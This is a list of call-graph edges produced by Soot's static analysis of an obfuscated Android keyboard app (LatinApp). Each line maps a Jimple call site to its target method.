SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hfd: void <init>(hff,java.lang.Class,ldp)> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lmb: lme f()> ==> <lnc: boolean hasNext()>
VIRTUAL edge: virtualinvoke r0.<lkh: int b(java.lang.Object[],int)>($r1, 0) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lrg: int b(java.lang.Object[],int)>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lrg: void <init>(java.lang.Object)> ==> <lma: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)>($i1, $r1, $r2, null, null) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)>
INTERFACE edge: $r5 = interfaceinvoke $r2.<java.util.List: java.util.Iterator iterator()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lkq: java.util.Iterator iterator()>
VIRTUAL edge: virtualinvoke r0.<nzh: void d()>() in <nzh: boolean f(ivv)> ==> <nzh: void d()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: void <init>(java.lang.String,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $i1 = staticinvoke <izw: int ak(int)>($i0) in <ljd: int b()> ==> <izw: int ak(int)>
SPECIAL edge: $z1 = specialinvoke $r2.<ivw: boolean P()>() in <ivw: boolean equals(java.lang.Object)> ==> <ivw: boolean P()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map: java.util.Set entrySet()>() in <lmb: lme f()> ==> <ljd: java.util.Set entrySet()>
STATIC edge: $z0 = staticinvoke <ivw: boolean t(char[],int,int)>($r3, $i0, $i1) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean t(char[],int,int)>
STATIC edge: $i6 = staticinvoke <izw: int ag(int,int,int)>($i7, $i8, $i4) in <ljf: int o(int,int,int,int)> ==> <izw: int ag(int,int,int)>
STATIC edge: $i2 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: int b()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: int b()>
STATIC edge: $i1 = staticinvoke <izw: int ak(int)>($i0) in <ljf: int b()> ==> <izw: int ak(int)>
INTERFACE edge: $z0 = interfaceinvoke $r6.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: boolean hasNext()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lnc: java.lang.Object next()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.Enum: void <init>(java.lang.String,int)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: $i4 = specialinvoke r0.<ljd: int z(int,int,int,int)>($i4, $i5, $i3, $i0) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int z(int,int,int,int)>
STATIC edge: staticinvoke <java.lang.Double: boolean isNaN(double)>($d0) in <lma: int e(int)> ==> <java.lang.Double: boolean isNaN(double)>
VIRTUAL edge: $r9 = virtualinvoke $r7.<lme: lma c()>() in <hbv: void j()> ==> <lme: lma c()>
STATIC edge: $i0 = staticinvoke <izw: int ag(int,int,int)>($i0, $i1, 31) in <ljd: void A(int)> ==> <izw: int ag(int,int,int)>
SPECIAL edge: specialinvoke r0.<lli: void <init>()>() in <lmb: void <init>()> ==> <lli: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r6.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.util.AbstractSet: int hashCode()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: java.lang.Object next()>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <ljf: int size()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r1, $r2) in <lkt: void a(java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r6.<gwk: void a(gwm)>(r0) in <hcb: void <init>()> ==> <gwk: void a(gwm)>
STATIC edge: staticinvoke <iye: void y(boolean,java.lang.Object)>(1, "Expected size must be >= 0") in <ljf: void i(int)> ==> <iye: void y(boolean,java.lang.Object)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: int hashCode()>
INTERFACE edge: $r11 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getKey()>() in <hbv: void j()> ==> <ljb: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r0.<miv: void <init>(java.lang.Object)>($r1) in <kwe: miy x(java.lang.Object)> ==> <miv: void <init>(java.lang.Object)>
STATIC edge: $r4 = staticinvoke <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])>("ar-XT", "bgp-XC", "bgp-XT", "bgq-PK", "bgq-XU", "bm-XF", $r0) in <ivw: void <clinit>()> ==> <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object[] y()>() in <ljd: void u(int,java.lang.Object)> ==> <ljd: java.lang.Object[] y()>
VIRTUAL edge: virtualinvoke r0.<ljf: void i(int)>(3) in <ljf: void <init>()> ==> <ljf: void i(int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: java.lang.Object get(int)>($i0) in <lkm: java.lang.Object a(int)> ==> <lql: java.lang.Object get(int)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r7, $i3, $r1, $i1, $i2) in <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: java.lang.Integer valueOf(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <lid: int hashCode()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)> ==> <lma: void <init>()>
SPECIAL edge: specialinvoke $r3.<ivw: void <init>(ivv,java.lang.String)>(r0, $r2) in <ivv: ivw i(java.lang.String)> ==> <ivw: void <init>(ivv,java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: int hashCode()>
VIRTUAL edge: $z2 = virtualinvoke $r9.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l6, $i7, $i5) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.String: void <init>()>() in <lsn: void <clinit>()> ==> <java.lang.String: void <init>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Parameter specified as non-null is null: method ") in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r2.<java.lang.ThreadLocal: void <init>()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.lang.ThreadLocal: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lqq: void <init>(java.lang.Object,java.lang.Object[],int)>(null, $r0, 1) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <lqq: void <init>(java.lang.Object,java.lang.Object[],int)>
STATIC edge: $i1 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: int a(int)>($i1) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: int a(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<lma: boolean m()>() in <lma: lma p(java.util.Collection)> ==> <lqr: boolean m()>
VIRTUAL edge: $r5 = virtualinvoke $r0.<androidx.core.content.FileProvider: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>(null, null) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>
VIRTUAL edge: virtualinvoke r0.<ljf: void j(int,java.lang.Object,int,int)>($i0, $r1, $i3, $i5) in <ljf: boolean add(java.lang.Object)> ==> <ljf: void j(int,java.lang.Object,int,int)>
STATIC edge: staticinvoke <iye: void y(boolean,java.lang.Object)>(1, "the total number of elements must fit in an int") in <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])> ==> <iye: void y(boolean,java.lang.Object)>
STATIC edge: $r6 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i4) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
INTERFACE edge: $r6 = interfaceinvoke $r4.<java.util.Set: java.util.Iterator iterator()>() in <lqs: boolean equals(java.lang.Object)> ==> <lqr: java.util.Iterator iterator()>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <lqr: int size()>
STATIC edge: $r4 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r3, $i2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
SPECIAL edge: specialinvoke $r4.<java.lang.Throwable: void <init>()>() in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <java.lang.Throwable: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.StringBuilder: java.lang.String toString()>() in <lri: void t(java.lang.Object,int)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r4 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r4) in <lqm: java.lang.Object get(int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <lmo: lqs G(java.util.Comparator)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkh: int c()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: int c()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <lrg: int hashCode()>
VIRTUAL edge: $c2 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i0) in <ivw: boolean v(java.lang.String)> ==> <java.lang.String: char charAt(int)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(4) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke r0.<lsn: void <init>(java.util.logging.Level)>($r1) in <lsd: void <init>(java.util.logging.Level)> ==> <lsn: void <init>(java.util.logging.Level)>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid language \'%s\', fallback to \'en\'", $r0, $r4) in <ivw: ivw d(java.util.Locale)> ==> <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lwc: void <init>()>() in <lwe: void <init>()> ==> <lwc: void <init>()>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>($r4) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iye: void O(int,int)>($i0, $i1) in <lqp: java.lang.Object get(int)> ==> <iye: void O(int,int)>
STATIC edge: $r11 = staticinvoke <lma: lma p(java.util.Collection)>($r10) in <lmb: lme f()> ==> <lma: lma p(java.util.Collection)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <lrg: int hashCode()>
CLINIT edge: staticinvoke <com.google.android.apps.inputmethod.latin.LatinApp: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <com.google.android.apps.inputmethod.latin.LatinApp: void <clinit>()>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lkq: int hashCode()>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r5) in <ljf: boolean add(java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int hashCode()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lsb: void <init>(int,int)>($i1, $i0) in <lkm: void <init>(lkq,int)> ==> <lsb: void <init>(int,int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkx: lma f()>() in <lkx: lma p()> ==> <lqq: lma f()>
INTERFACE edge: $z1 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <liz: boolean hasNext()>
STATIC edge: $i5 = staticinvoke <izw: int af(int,int)>($i3, $i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int af(int,int)>
VIRTUAL edge: $r7 = virtualinvoke r0.<lqs: lsa l()>() in <lqs: boolean equals(java.lang.Object)> ==> <lqs: lsa l()>
VIRTUAL edge: virtualinvoke r0.<nzh: void d()>() in <nzh: boolean f(ivv)> ==> <nzh: void d()>
VIRTUAL edge: virtualinvoke $r2.<j$.sun.misc.b: void l(java.lang.Object,long,java.lang.Object)>($r0, $l0, $r1) in <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)> ==> <j$.sun.misc.b: void l(java.lang.Object,long,java.lang.Object)>
STATIC edge: $i7 = staticinvoke <izw: int aj(java.lang.Object,int)>($r5, $i6) in <ljf: boolean add(java.lang.Object)> ==> <izw: int aj(java.lang.Object,int)>
STATIC edge: $z0 = staticinvoke <lma: boolean x(int,int)>($i0, $i1) in <lly: lma g()> ==> <lma: boolean x(int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: int rotateLeft(int,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lta: int hashCode()>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r1, $i3, $i6) in <ljd: int z(int,int,int,int)> ==> <izw: void an(java.lang.Object,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljd: void u(int,java.lang.Object)>($i0, $r2) in <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)> ==> <ljd: void u(int,java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljd: void p()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: void p()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lrg: int hashCode()>
STATIC edge: $r0 = staticinvoke <lth: lth i(java.lang.String)>("EntryStoreHelper") in <hnc: void <clinit>()> ==> <lth: lth i(java.lang.String)>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <lsb: java.lang.Object next()>
STATIC edge: $r1 = staticinvoke <luk: lum a(java.lang.String[])>($r0) in <luk: void <clinit>()> ==> <luk: lum a(java.lang.String[])>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <iye: void I(boolean,java.lang.Object)>($z0, "Arrays already allocated") in <ljd: int b()> ==> <iye: void I(boolean,java.lang.Object)>
STATIC edge: $r2 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i1) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $i6 = staticinvoke <izw: int ac(int)>($i6) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: int ac(int)>
CLINIT edge: staticinvoke <lsn: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsn: void <clinit>()>
SPECIAL edge: specialinvoke $r8.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <lvr: void <init>(java.util.List)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <lki: java.lang.Object getKey()>
STATIC edge: $r2 = staticinvoke <lvm: lum j()>() in <luk: lum a(java.lang.String[])> ==> <lvm: lum j()>
STATIC edge: $i3 = staticinvoke <izw: int af(int,int)>($i2, $i0) in <ljf: int o(int,int,int,int)> ==> <izw: int af(int,int)>
STATIC edge: $r4 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>($r1) in <hcb: void <init>()> ==> <android.net.Uri: android.net.Uri parse(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljf: int c()>() in <lje: void <init>(ljf)> ==> <ljf: int c()>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i0) in <ljf: void l(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <ljf: java.util.Iterator iterator()>
CLINIT edge: staticinvoke <her: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <her: void <clinit>()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lsp: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: int numberOfLeadingZeros(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <lqr: java.util.Iterator iterator()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lqr: lsa l()>() in <lqr: java.util.Iterator iterator()> ==> <lqr: lsa l()>
STATIC edge: $z0 = staticinvoke <iwt: boolean o(char)>($c0) in <ivw: boolean O(char)> ==> <iwt: boolean o(char)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: boolean equals(java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r1.<j$.util.concurrent.q: j$.util.concurrent.l c()>() in <j$.util.concurrent.ConcurrentHashMap: int hashCode()> ==> <j$.util.concurrent.q: j$.util.concurrent.l c()>
STATIC edge: $i0 = staticinvoke <izw: int af(int,int)>($i0, $i1) in <ljd: int f(java.lang.Object)> ==> <izw: int af(int,int)>
SPECIAL edge: specialinvoke r0.<ljf: void q(int)>($i1) in <ljf: int b()> ==> <ljf: void q(int)>
SPECIAL edge: specialinvoke $r23.<jhe: void <init>(lak,lsr,int,byte[])>($r10, $r1, 20, null) in <lsd: boolean b(lsr)> ==> <jhe: void <init>(lak,lsr,int,byte[])>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r5.<java.util.concurrent.atomic.AtomicLong: void set(long)>($l0) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.util.concurrent.atomic.AtomicLong: void set(long)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liz: java.lang.Object next()>
INTERFACE edge: $r6 = interfaceinvoke $r4.<java.util.Set: java.util.Iterator iterator()>() in <lqs: boolean equals(java.lang.Object)> ==> <liy: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int indexOf(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <ojg: void c(java.lang.Object,java.lang.String)>($r3, "copyOf(this, newSize)") in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ojg: void c(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.NullPointerException: void <init>(java.lang.String)>($r2) in <ojg: void v(java.lang.String)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
VIRTUAL edge: $r4 = virtualinvoke $r2.<ivw: java.lang.String p()>() in <ivw: boolean equals(java.lang.Object)> ==> <ivw: java.lang.String p()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljf: int d(int)>($i0) in <ljf: java.util.Set f()> ==> <ljf: int d(int)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Iterator: java.lang.Object next()>() in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <liz: java.lang.Object next()>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <java.lang.Object: int hashCode()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <lql: java.lang.Object get(int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>($r0, 0, $r0, 0, 0) in <lqr: void <clinit>()> ==> <lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>
CLINIT edge: staticinvoke <lnd: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lnd: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<lvr: boolean equals(java.lang.Object)>($r4) in <lvt: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r2.<ivv: void f(java.lang.String)>($r6) in <ivw: ivw d(java.util.Locale)> ==> <ivv: void f(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lma: boolean d()>() in <lma: boolean equals(java.lang.Object)> ==> <lqr: boolean d()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.Throwable: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r19.<java.util.concurrent.atomic.AtomicInteger: int getAndSet(int)>(0) in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicInteger: int getAndSet(int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object h(int)>($i2) in <ljd: int f(java.lang.Object)> ==> <ljd: java.lang.Object h(int)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <izw: java.lang.Object al(int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r6.<lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>($r2, $i0, $r1, $i1, $i2) in <lly: lma g()> ==> <lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liy: int size()>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqs: lsa l()>
